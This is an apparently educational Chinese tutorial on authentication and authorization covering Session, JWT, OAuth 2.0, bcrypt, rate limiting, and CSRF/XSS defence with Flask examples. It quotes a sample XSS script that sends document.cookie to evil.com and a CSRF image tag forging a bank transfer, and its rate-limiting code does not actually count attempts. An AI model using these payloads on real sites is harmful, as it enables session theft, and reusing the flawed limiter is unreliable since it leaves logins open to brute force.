# 認證與授權原理
> 💡 **學習指南**：本章節带你深入理解後端系统的"門禁系统"——鑑權與授權。我们将從最基础的"你是誰"讲起，一步步掌握 Session、JWT、OAuth2.0 等現代鑑權方案。

<AuthEvolutionDemo />

## 0. 引言：系统的"門禁"

你登錄微信後，為什么關掉再打開還是登錄狀態？
你访問 B 站，為什么知道你是大會员還是普通用户？
你用微信扫碼登錄第三方網站，為什么不用輸入密碼？

這背後都有一个核心系统：**鑑權與授權 (Authentication & Authorization)**。

如果把後端系统比作一栋大楼：

- **鑑權 (Authentication)**：确認"你是誰"（验證身份證/門禁卡）。
- **授權 (Authorization)**：确認"你能去哪裡"（VIP 能進 VIP 休息室，普通用户不行）。

### 0.1 鑑權的必要性

只有一个理由：**保護资源**。

- **隱私保護**：你的个人信息、聊天記錄，只有你能看。
- **權限控制**：管理员可以删除用户，普通用户不行。
- **防止滥用**：防止恶意調用、刷接口。

<AuthBasicsDemo />

### 0.2 交互式演示：登錄流程

讓我们通過一个真實的登錄演示，來理解認證和授權是如何工作的。

<AuthInteractiveLoginDemo />

**關鍵點**：鑑權是第一道防线，所有敏感操作都必须先验證身份。

---

## 1. 基础概念：認證 vs 授權

### 1.1 認證 (Authentication)：你的主體界定

确認用户的身份。

- _例子_：輸入用户名密碼、刷指纹、人脸識別。
- _輸出_：一个代表"你"的令牌（Token）。
- _英文简称_：**AuthN**

### 1.2 授權 (Authorization)：的權限範圍界定

确認用户有哪些權限。

- _例子_：管理员可以删除文章，普通用户只能點讚。
- _輸出_：允许或拒绝访問。
- _英文简称_：**AuthZ**

### 1.3 兩者的關系

```
用户請求 → 認證 (你是誰？) → 授權 (你能做吗？) → 執行業務邏輯
           ↓                        ↓
      验證身份               檢查權限
      (Token 有效？)         (有 delete 權限？)
```

<AuthNvsAuthZDemo />

**關鍵點**：先認證，再授權。只有确認了"你是誰"，才能判断"你能干什么"。

---

## 2. 方案演進史

### 2.1 第一代：HTTP Basic Authentication

最古老的方案，直接把用户名密碼放在 HTTP 頭裡。

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **優點**：简單，所有浏览器都支持。
- **缺點**：
  - 不安全（Base64 可解碼，相当于明文）。
  - 每次請求都要傳密碼（容易被截獲）。
  - 无法主動注銷（除非關閉浏览器）。

**結论**：只適合內部測試工具，绝不用于生產環境。

### 2.2 第二代：Session + Cookie

Web 開發的經典方案。

**流程**：

```
1. 用户登錄 (POST /login)
   → 服務器验證用户名密碼
   → 創建 Session（在服務器內存或 Redis）
   → 返回 Set-Cookie: session_id=abc123

2. 後續請求
   → 浏览器自動带上 Cookie: session_id=abc123
   → 服務器根據 session_id 查找 Session
   → 找到就認為"你是你"
```

**代碼示例**：

```python
# 後端 (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # 验證用户名密碼
    user = db.authenticate(username, password)
    if user:
        # 創建 Session
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "用户名或密碼錯误"}, 401

@app.route("/api/admin/users")
def get_users():
    # 檢查 Session
    if "user_id" not in session:
        return {"error": "未登錄"}, 401

    # 檢查權限
    if session.get("role") != "admin":
        return {"error": "權限不足"}, 403

    # 執行業務邏輯
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**優點**：

- 简單直观，易于理解。
- 服務端可以主動注銷（删除 Session）。

**缺點**：

- **服務器有狀態**：需要存儲 Session，多台服務器需要共享（如 Redis）。
- **跨域困難**：Cookie 默認不能跨域（CORS 問题）。
- **CSRF 攻擊**：恶意網站可以冒用你的 Cookie。

**結论**：適合傳统 Web 應用（服務器端渲染），不適合移動端和現代 SPA。

### 2.3 第三代：Token (JWT)

現代 Web 的主流方案。

**核心思想**：不在服務端存儲狀態，把用户信息加密成 Token，放在客户端。

**JWT 結構**：

```
JWT = Header.Payload.Signature

例子:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header**：算法信息（如 `{"alg": "HS256", "typ": "JWT"}`）。
- **Payload**：用户信息（如 `{"user_id": 123, "role": "admin", "exp": 1616239022}`）。
- **Signature**：簽名（防篡改）。

**流程**：

```python
# 1. 用户登錄
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # 生成 JWT
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # 24 小時過期
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "用户名或密碼錯误"}, 401

# 2. 後續請求
@app.route("/api/admin/users")
def get_users():
    # 從 Header 獲取 Token
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "未提供 Token"}, 401

    token = auth_header.split(" ")[1]

    try:
        # 验證并解析 Token
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Token 已過期"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token 无效"}, 401

    # 檢查權限
    if payload.get("role") != "admin":
        return {"error": "權限不足"}, 403

    # 執行業務邏輯
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**優點**：

- **无狀態**：服務端不存儲 Session，易于横向擴展。
- **跨域友好**：放在 Header 裡，不受 Cookie 跨域限制。
- **移動端友好**：原生 App 也能輕松使用。
- **信息豐富**：Payload 可以存用户信息、權限等。

**缺點**：

- **无法主動注銷**：Token 一旦簽發，在過期前一直有效（除非用黑名單）。
- **Payload 可见**：Base64 編碼，不能存敏感信息（如密碼）。
- **Token 過大**：每次請求都要带上，几百字節。

**結论**：現代 Web 和移動端的標準方案。

<SessionVsJWTDemo />

---

## 3. OAuth 2.0：第三方登錄

你肯定见過這个按钮："使用微信登錄"、"使用 Google 登錄"。

這就是 **OAuth 2.0**：一个**授權**框架（不是認證！）。

### 3.1 核心角色

| 角色                     | 說明               | 例子               |
| :----------------------- | :----------------- | :----------------- |
| **Resource Owner**       | 资源所有者（用户） | 你                 |
| **Client**               | 第三方應用         | 某个網站           |
| **Authorization Server** | 授權服務器         | 微信、Google       |
| **Resource Server**      | 资源服務器         | 微信的用户信息 API |

### 3.2 授權碼模式 (Authorization Code Flow)

最安全的模式，適合有後端的服務器。

**流程**：

```
1. 用户點擊"使用微信登錄"
   → 跳轉到微信授權頁面
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. 用户扫碼并同意授權
   → 微信重定向回你的網站
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. 你的後端用 code 换取 access_token
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → 返回: { "access_token": "...", "openid": "..." }

4. 用 access_token 獲取用户信息
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → 返回: { "nickname": "张三", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**代碼示例**：

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. 重定向到微信授權頁面
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. 獲取 code
    code = request.args.get("code")
    state = request.args.get("state")

    # 验證 state（防 CSRF）
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. 用 code 换取 access_token
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. 獲取用户信息
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. 本地創建或更新用户
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. 生成本系统的 JWT
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**關鍵點**：

- **code 只能用一次**：用完即失效，防止截獲。
- **state 防 CSRF**：生成隨機字符串，回調時验證，防止恶意網站偽造。
- **redirect_uri 必须匹配**：提前在微信開放平台注册，防止重定向攻擊。

### 3.3 其他模式

| 模式                                | 適用場景                     | 安全性           |
| :---------------------------------- | :--------------------------- | :--------------- |
| **授權碼模式**                      | 有後端的服務器               | ⭐⭐⭐⭐⭐       |
| **简化模式 (Implicit)**             | 纯前端應用（SPA）            | ⭐⭐⭐（不推荐） |
| **密碼模式 (Resource Owner)**       | 高度信任的應用（如官方 App） | ⭐⭐             |
| **客户端模式 (Client Credentials)** | 服務器間通信（无用户）       | ⭐⭐⭐⭐         |

<OAuth2ModesDemo />

---

## 4. 實戰：設計一个完整的鑑權系统

### 4.1 需求分析

- **多端支持**：Web、iOS、Android。
- **第三方登錄**：微信、Google。
- **權限控制**：普通用户、VIP、管理员。
- **安全**：防刷、防劫持、防重放。

### 4.2 架構設計

```
┌─────────────┐
│   客户端     │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting (限流)          │
│  - Token Validation (校验)       │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service (鑑權服務)     │
│  - 注册、登錄                    │
│  - Token 簽發與验證              │
│  - OAuth 2.0 集成                │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services             │
│  - User Service                  │
│  - Order Service                 │
│  - Payment Service               │
└─────────────────────────────────┘
```

### 4.3 數據庫設計

```sql
-- 用户表
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- bcrypt 哈希
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- 第三方登錄绑定表
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- 第三方的用户 ID
    access_token TEXT,  -- 加密存儲
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Token 黑名單（用于主動注銷）
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JWT 的 JTI (唯一標識)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 代碼實現

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # 生產環境用環境變量

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. 檢查用户名是否存在
        if db.get_user_by_username(username):
            raise ValueError("用户名已存在")

        # 2. 哈希密碼（bcrypt）
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. 創建用户
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. 簽發 Token
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. 查询用户
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("用户名或密碼錯误")

        # 2. 验證密碼
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("用户名或密碼錯误")

        # 3. 簽發 Token
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (短期，如 1 小時)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # 唯一標識
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (長期，如 30 天)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # access_token 過期時間（秒）
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Refresh token 已過期")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token 无效")

    def logout(self, token: str):
        # 将 Token 加入黑名單
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # 檢查是否在黑名單中
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token 已注銷")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token 已過期")
        except jwt.InvalidTokenError:
            raise ValueError("Token 无效")

# API 装飾器
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # 從 Header 獲取 Token
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "未提供 Token"}, 401

            token = auth_header.split(" ")[1]

            try:
                # 验證 Token
                payload = auth_service.verify_token(token)
                # 将用户信息注入到請求上下文
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "未登錄"}, 401

            if request.user["role"] not in roles:
                return {"error": "權限不足"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# 使用示例
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. 安全最佳實踐

### 5.1 密碼存儲

**❌ 錯误做法**：

```python
# 明文存儲（绝對不行！）
db.save_password(username, password)

# MD5 / SHA1 哈希（不够安全，容易被彩虹表破解）
hash = md5(password)
db.save_password(username, hash)
```

**✅ 正确做法**：

```python
# bcrypt（自適應哈希，慢哈希防暴力破解）
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # rounds 越大越安全，但也越慢
)

# 验證
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # 密碼正确
```

**為什么 bcrypt？**

- **慢**：故意設計得很慢（毫秒级），防暴力破解。
- **自適應**：可以調整 rounds，隨硬件變強而增強。
- **加盐**：自带隨機盐，防彩虹表。

<PasswordHashingDemo />

### 5.2 防暴力破解

- **限流**：同一个 IP / 用户名，1 分鐘只能試 5 次。
- **验證碼**：失敗 3 次後要求輸入验證碼。
- **账号鎖定**：失敗 10 次後鎖定账号 30 分鐘。

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """返回 (尝試次數, 第一次尝試時間)"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # 1 分鐘內清零
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # 超過 5 次，拒绝
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # 重新緩存

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # 檢查限流
    if not check_rate_limit(username):
        return {"error": "尝試次數過多，請 1 分鐘後再試"}, 429

    password = request.json["password"]

    # 验證密碼
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # 登錄成功，清空計數
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # 登錄失敗，記錄
        record_login_attempt(username)
        return {"error": "用户名或密碼錯误"}, 401
```

### 5.3 防 CSRF (Cross-Site Request Forgery)

**攻擊場景**：
你登錄了銀行網站 `bank.com`，然後访問了恶意網站 `evil.com`。`evil.com` 的頁面裡有一段代碼：

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

你的浏览器會带上銀行的 Cookie 發起這个請求（跨域請求），導致资金被轉走。

**防御措施**：

1.  **CSRF Token**：
    - 服務端生成隨機 Token，放在表單裡。
    - 提交時验證 Token 是否匹配。

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # 验證 CSRF Token
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token 无效"}, 403

    # 執行轉账
    ...
```

2.  **SameSite Cookie**：
    - 設置 Cookie 的 `SameSite` 属性為 `Strict` 或 `Lax`。

```python
# Flask 示例
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # 或 'Strict'
    SESSION_COOKIE_SECURE=True      # 只允许 HTTPS
)
```

3.  **使用 JWT（不用 Cookie）**：
    - JWT 存在 `localStorage`，不會自動带上，天然防 CSRF。

<CSRFDefenseDemo />

### 5.4 防 XSS (Cross-Site Scripting)

**攻擊場景**：
恶意用户在評论區輸入：

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

如果網站直接渲染這段內容，其他用户的 Cookie 就會被盗走。

**防御措施**：

1.  **輸出轉義**：
    - 把 `<` 轉成 `&lt;`，`>` 轉成 `&gt;`。

```python
import html

def render_comment(comment):
    # 轉義 HTML
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)**：
    - 設置 HTTP 頭，限制脚本來源。

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**：
    - 設置 Cookie 的 `HttpOnly` 属性，JavaScript 无法讀取。

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. 總結與學習路线

鑑權是後端系统的"基本功"，掌握了它才能構建安全可靠的應用。

### 6.1 核心知識點

| 知識點                | 重要程度   | 難度 | 實戰频率 |
| :-------------------- | :--------- | :--- | :------- |
| **Session + Cookie**  | ⭐⭐⭐⭐   | 中   | 高       |
| **JWT**               | ⭐⭐⭐⭐⭐ | 低   | 极高     |
| **OAuth 2.0**         | ⭐⭐⭐⭐   | 高   | 高       |
| **密碼哈希 (bcrypt)** | ⭐⭐⭐⭐⭐ | 低   | 极高     |
| **限流與防暴力破解**  | ⭐⭐⭐⭐⭐ | 中   | 极高     |
| **CSRF 防御**         | ⭐⭐⭐⭐   | 中   | 中       |
| **XSS 防御**          | ⭐⭐⭐⭐   | 低   | 高       |

### 6.2 學習路线

1.  **入門**（1-2 天）：
    - 理解認證 vs 授權。
    - 掌握 Session + Cookie 的原理。
    - 實現一个简單的登錄注册功能。

2.  **進階**（1 周）：
    - 學習 JWT 的原理和實現。
    - 實現基于 JWT 的鑑權系统。
    - 掌握密碼哈希（bcrypt）。

3.  **實戰**（2-4 周）：
    - 集成 OAuth 2.0（微信、Google 登錄）。
    - 實現限流、防暴力破解。
    - 防御 CSRF、XSS 等常见攻擊。

4.  **深入**（持續）：
    - 學習 RBAC（基于角色的访問控制）。
    - 研究 SSO（單點登錄）。
    - 探索 Zero Trust Architecture（零信任架構）。

### 6.3 推荐资源

- **標準**：
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **文章**：
  - JWT.io: https://jwt.io/
  - OAuth 2.0 简體中文版: https://oauth.net/2/
- **工具**：
  - jwt.io (JWT 在线調試)
  - Postman (API 測試)

---

## 7. 名词速查表 (Glossary)

| 名词              | 全称                        | 解釋                                                                               |
| :---------------- | :-------------------------- | :--------------------------------------------------------------------------------- |
| **AuthN**         | Authentication              | **認證**。确認"你是誰"（如輸入密碼验證身份）。                                     |
| **AuthZ**         | Authorization               | **授權**。确認"你能干什么"（如管理员才能删除）。                                   |
| **Session**       | -                           | **會话**。服務端存儲的用户狀態信息。                                               |
| **Cookie**        | -                           | **小甜餅**。浏览器存儲的小段數據，每次請求都會自動带上。                           |
| **JWT**           | JSON Web Token              | **JSON Web 令牌**。一種无狀態的認證方案，包含 Header、Payload、Signature 三部分。  |
| **OAuth 2.0**     | -                           | **開放授權**。第三方登錄的標準化框架（如"用微信登錄"）。                           |
| **SSO**           | Single Sign-On              | **單點登錄**。登錄一次，就可以访問多个應用（如 Google 账号登錄所有 Google 服務）。 |
| **RBAC**          | Role-Based Access Control   | **基于角色的访問控制**。根據用户的角色（如 admin、user）决定權限。                 |
| **CSRF**          | Cross-Site Request Forgery  | **跨站請求偽造**。攻擊者诱導用户發送恶意請求（如用你的 Cookie 發起轉账）。         |
| **XSS**           | Cross-Site Scripting        | **跨站脚本攻擊**。攻擊者在網頁注入恶意脚本（如盗取 Cookie）。                      |
| **bcrypt**        | -                           | **密碼哈希算法**。一種慢哈希算法，專門用于密碼存儲，防暴力破解。                   |
| **Access Token**  | -                           | **访問令牌**。短期有效的令牌，用于访問 API。                                       |
| **Refresh Token** | -                           | **刷新令牌**。長期有效的令牌，用于獲取新的 Access Token。                          |
| **Scope**         | -                           | **權限范围**。OAuth 2.0 中的概念，表示第三方應用請求的權限（如讀取用户信息）。     |
| **PKCE**          | Proof Key for Code Exchange | **授權碼交换的證明密鑰**。OAuth 2.0 的擴展，用于公共客户端（如 SPA）的安全增強。   |
